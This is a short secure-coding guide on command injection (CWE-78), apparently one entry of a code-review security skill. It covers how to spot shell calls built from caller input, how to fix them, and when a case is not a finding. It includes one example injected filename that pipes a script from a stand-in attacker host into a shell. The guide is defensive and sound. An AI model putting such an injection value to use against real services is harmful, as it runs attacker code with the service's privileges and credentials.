> Part of the `security` skill. CWE-78 · OWASP A03 Injection.

# Command injection

**The tell.** A shell is invoked with a string that includes caller-supplied input: `system`, `exec`, `popen`, backticks, `sh -c`, or a spawn call with `shell: true`.

**Failure scenario.** A filename parameter arrives as `file.txt; curl attacker.sh | sh`. The shell interprets the separator, and the process runs arbitrary code with the service's privileges — which usually includes its cloud credentials.

**The fix.** Do not involve a shell. Use the argument-vector form of process execution (`execFile`, `subprocess.run([...], shell=False)`, `Open3.capture3` with separate args) so the input can only ever be one argument. If a shell is genuinely required, whitelist the input against a fixed set; quoting helpers are a last resort and are easy to get wrong across platforms.

**Watch for.** Input reaching a *flag* rather than a value (`--output=/etc/passwd`), which argument separation does not stop; and indirect shells — `git`, `ffmpeg`, `tar` and archive tools that accept command-executing options.

**Not a finding when.** Every element of the argument vector is a constant or a value drawn from a closed enum.
